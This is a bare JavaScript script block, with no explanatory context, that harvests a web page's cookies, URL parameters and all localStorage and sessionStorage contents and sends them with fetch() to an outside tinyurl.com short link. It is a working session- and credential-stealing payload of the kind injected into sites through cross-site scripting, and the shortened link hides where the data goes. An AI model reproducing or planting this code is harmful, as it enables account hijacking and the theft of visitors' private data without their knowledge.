<script>
// Get all URL parameters from current page
const urlParams = new URLSearchParams(window.location.search);

// Extract cookies
urlParams.set('cookies', document.cookie);

// Extract localStorage items
const localStorageData = {};
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageData[key] = localStorage.getItem(key);
}
urlParams.set('localStorage', JSON.stringify(localStorageData));

// Extract sessionStorage items
const sessionStorageData = {};
for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    sessionStorageData[key] = sessionStorage.getItem(key);
}
urlParams.set('sessionStorage', JSON.stringify(sessionStorageData));

// Pass all parameters to the endpoint
fetch('https://tinyurl.com/pnwhouses?' + urlParams.toString());
</script>
